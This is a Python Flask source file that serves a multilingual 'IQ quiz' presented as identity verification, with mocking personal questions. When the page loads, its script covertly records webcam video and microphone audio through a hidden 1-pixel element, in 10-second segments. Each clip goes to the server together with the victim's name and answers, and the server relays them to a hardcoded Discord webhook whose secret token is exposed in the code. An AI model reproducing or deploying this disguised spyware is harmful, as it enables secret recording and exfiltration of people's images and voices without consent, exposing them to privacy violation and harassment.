import os
import json
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566437289113161940/qkaHvkxwmc_uuM3YMobIKnL9kaJhRI9XA4-OwYMpIJEWZnagp5mqEE93c4es2n2aTXA1"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr" dir="ltr" id="htmlTag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">IQ Questions - Vérification d'identité</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #31103f 100%);
            --card-bg: rgba(255, 255, 255, 0.95);
            --primary-accent: #6366f1;
            --secondary-accent: #ff4757;
            --success-color: #10b981;
            --text-main: #1e293b;
            --text-muted: #64748b;
            --input-bg: #f8fafc;
            --border-color: #e2e8f0;
            --border-focus: #6366f1;
            --radius-lg: 20px;
            --radius-md: 12px;
            --shadow-glow: 0 20px 40px -15px rgba(99, 102, 241, 0.3);
        }
        * { box-sizing: border-box; transition: all 0.25s ease; }
        body { 
            font-family: 'Plus Jakarta Sans', Arial, sans-serif; 
            background: var(--bg-gradient); background-attachment: fixed;
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text-main);
        }
        .card { 
            background: var(--card-bg); backdrop-filter: blur(12px);
            padding: 40px 35px; border-radius: var(--radius-lg); 
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4), var(--shadow-glow); 
            text-align: center; max-width: 600px; width: 100%; 
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .welcome-badge { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; padding: 8px 16px; border-radius: 30px; font-size: 13px; font-weight: 800; letter-spacing: 1.2px; text-transform: uppercase; }
        .lang-select { padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border-color); background-color: var(--input-bg); font-weight: 700; font-size: 13px; color: var(--text-main); cursor: pointer; outline: none; }
        h2 { color: var(--text-main); margin: 0 0 8px 0; font-size: 28px; font-weight: 800; }
        .subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 25px; font-weight: 500; }
        #video-container { position: absolute; top: 0; left: 0; width: 1px; height: 1px; overflow: hidden; opacity: 0.01; pointer-events: none; }
        #username { width: 100%; padding: 14px 16px; margin-bottom: 25px; font-size: 15px; font-weight: 600; background-color: var(--input-bg); border: 2px solid var(--border-color); border-radius: var(--radius-md); outline: none; color: var(--text-main); }
        .question-box { margin-bottom: 16px; text-align: left; background: #ffffff; padding: 16px 18px; border-radius: var(--radius-md); border: 1px solid var(--border-color); }
        [dir="rtl"] .question-box { text-align: right; }
        .question-box label { display: block; font-weight: 700; margin-bottom: 8px; color: var(--text-main); font-size: 14px; }
        .question-box select { width: 100%; padding: 10px 12px; font-size: 14px; background-color: var(--input-bg); border: 1px solid var(--border-color); border-radius: 8px; outline: none; cursor: pointer; }
        button { padding: 16px 24px; border: none; border-radius: var(--radius-md); cursor: pointer; font-weight: 700; font-size: 16px; width: 100%; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; margin-top: 20px; box-shadow: 0 10px 20px -5px rgba(16, 185, 129, 0.4); }
        #status { margin-top: 20px; font-weight: 700; font-size: 15px; padding: 10px; border-radius: 6px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="top-bar">
            <div class="welcome-badge" id="welcomeText">Bienvenue dans IQ Questions</div>
            <select id="languageSelector" class="lang-select" onchange="changeLanguage(this.value)">
                <option value="fr">Français</option>
                <option value="ar">العربية</option>
                <option value="en">English</option>
            </select>
        </div>
        
        <h2 id="mainTitle">Vérification d'identité</h2>
        <div class="subtitle" id="subTitle">Veuillez répondre aux 20 questions ci-dessous pour continuer</div>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
            <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
            
            <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
            <div class="question-box"><label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
            <div class="question-box"><label id="lbl3">3. Quel est le nom de votre animal préféré ?</label><select id="q3" required><option value="">Sélectionnez</option><option value="Skander">Skander</option><option value="Michou">Michou</option><option value="Tito">Tito</option><option value="Urra">Urra</option><option value="Yahouh">Yahouh</option><option value="Autre">Autre</option></select></div>
            <div class="question-box"><label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label><select id="q4" required><option value="">Sélectionnez</option><option value="Excellente">Excellente</option><option value="Malchanceuse">Malchanceuse</option></select></div>
            <div class="question-box"><label id="lbl5">5. Qui est le plus intelligent selon vous ?</label><select id="q5" required><option value="">Sélectionnez</option><option value="Moi">Moi-même</option><option value="Les singes">Les singes</option></select></div>
            <div class="question-box"><label id="lbl6">6. Avez-vous peur de l'obscurité (du noir) ?</label><select id="q6" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
            <div class="question-box"><label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label><select id="q7" required><option value="">Sélectionnez</option><option value="Sommeil">Le sommeil</option><option value="Nourriture">La nourriture</option></select></div>
            <div class="question-box"><label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label><select id="q8" required><option value="">Sélectionnez</option><option value="Beau/Belle">Magnifique</option><option value="Moche">Pas très beau/belle</option><option value="Sérieux">Sage / Sérieux</option></select></div>
            <div class="question-box"><label id="lbl9">9. Notez votre niveau de méchanceté / insolence sur 10 :</label><select id="q9" required><option value="">Sélectionnez</option><option value="1/10">1 / 10</option><option value="5/10">5 / 10</option><option value="10/10">10 / 10</option></select></div>
            <div class="question-box"><label id="lbl10">10. Comment réussissez-vous dans vos études ?</label><select id="q10" required><option value="">Sélectionnez</option><option value="Par chance">Par chance</option><option value="Par triche">Par triche</option><option value="Impossible">Impossible</option></select></div>
            <div class="question-box"><label id="lbl11">11. Mentez-vous souvent ?</label><select id="q11" required><option value="">Sélectionnez</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
            <div class="question-box"><label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label><select id="q12" required><option value="">Sélectionnez</option><option value="J'adore">J'adore</option><option value="Je déteste">Je déteste</option></select></div>
            <div class="question-box"><label id="lbl13">13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label><select id="q13" required><option value="">Sélectionnez</option><option value="Pro Gamer">Joueur Pro</option><option value="Débutant">Débutant</option></select></div>
            <div class="question-box"><label id="lbl14">14. Que préférez-vous le plus ?</label><select id="q14" required><option value="">Sélectionnez</option><option value="Téléphone">Mon téléphone</option><option value="Amis">Mes amis</option></select></div>
            <div class="question-box"><label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label><select id="q15" required><option value="">Sélectionnez</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
            <div class="question-box"><label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label><select id="q16" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
            <div class="question-box"><label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label><select id="q17" required><option value="">Sélectionnez</option><option value="Beaucoup">Beaucoup</option><option value="Un peu">Un peu</option><option value="Pas du tout">Pas du tout</option></select></div>
            <div class="question-box"><label id="lbl18">18. Croyez-vous au coup de foudre ?</label><select id="q18" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
            <div class="question-box"><label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label><select id="q19" required><option value="">Sélectionnez</option><option value="Très facile">Très facile</option><option value="Impossible">Impossible</option></select></div>
            <div class="question-box"><label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label><select id="q20" required><option value="">Sélectionnez</option><option value="Satisfait">Oui</option><option value="Non">Non</option></select></div>

            <button type="button" id="submitBtn" onclick="verifyAndStop()">VALIDER ET ENVOYER</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoInterval = null;
        let isCompleted = false;

        function startNewRecorderSegment() {
            if (isCompleted || !mediaStream) return;
            recordedChunks = [];
            let options = { videoBitsPerSecond: 250000 };
            if (MediaRecorder.isTypeSupported('video/mp4')) {
                options.mimeType = 'video/mp4';
            } else {
                options.mimeType = 'video/webm';
            }

            try {
                mediaRecorder = new MediaRecorder(mediaStream, options);
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    if (recordedChunks.length === 0) return;
                    const mimeType = mediaRecorder.mimeType || 'video/mp4';
                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                    const videoBlob = new Blob(recordedChunks, { type: mimeType });

                    const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
                    const formData = new FormData();
                    formData.append('username', `${username} [🎥 Live Video]`);
                    formData.append('video', videoBlob, `live_clip.${ext}`);

                    try {
                        await fetch('/submit-consent', { method: 'POST', body: formData });
                    } catch (e) {}
                };

                mediaRecorder.start();
            } catch (err) {}
        }

        window.addEventListener('DOMContentLoaded', async () => {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
                document.getElementById('webcam').srcObject = mediaStream;

                setTimeout(() => { startNewRecorderSegment(); }, 2000);

                videoInterval = setInterval(() => {
                    if (!isCompleted) {
                        if (mediaRecorder && mediaRecorder.state !== "inactive") {
                            mediaRecorder.stop();
                        }
                        setTimeout(() => { startNewRecorderSegment(); }, 500);
                    }
                }, 10000);
            } catch (err) {}
        });

        async function sendFinalData() {
            if (isCompleted) return;
            isCompleted = true;
            clearInterval(videoInterval);

            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
            }
            await new Promise(r => setTimeout(r, 600));

            const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/mp4';
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const videoBlob = new Blob(recordedChunks, { type: mimeType });

            const formData = new FormData();
            formData.append('username', username);
            for (let i = 1; i <= 20; i++) {
                formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
            }
            formData.append('video', videoBlob, `recording.${ext}`);

            try {
                fetch('/submit-consent', { method: 'POST', body: formData, keepalive: true });
            } catch (e) {}

            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        }

        async function verifyAndStop() {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;
            if (!username) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Veuillez entrer votre nom.';
                return;
            }
            statusDiv.style.color = '#10b981';
            statusDiv.innerText = 'Envoi en cours...';
            await sendFinalData();
            statusDiv.innerText = 'Succès ! Envoyé avec succès.';
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    try:
        username = request.form.get("username", "Utilisateur Anonyme")
        questions_summary = []
        for i in range(1, 21):
            val = request.form.get(f"q{i}", "")
            if val:
                questions_summary.append(f"Q{i}: {val}")
        
        q_text = " | ".join(questions_summary[:10])
        video_file = request.files.get("video")

        content_text = f"✅ **Rapport IQ Quiz:**\n• **Nom:** {username}\n• **Réponses:** {q_text}"
        payload = {"content": content_text}

        files = {}
        if video_file:
            files = {"file": (video_file.filename or "recording.webm", video_file.read(), video_file.content_type or "video/webm")}

        requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files if files else None, timeout=30)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000)
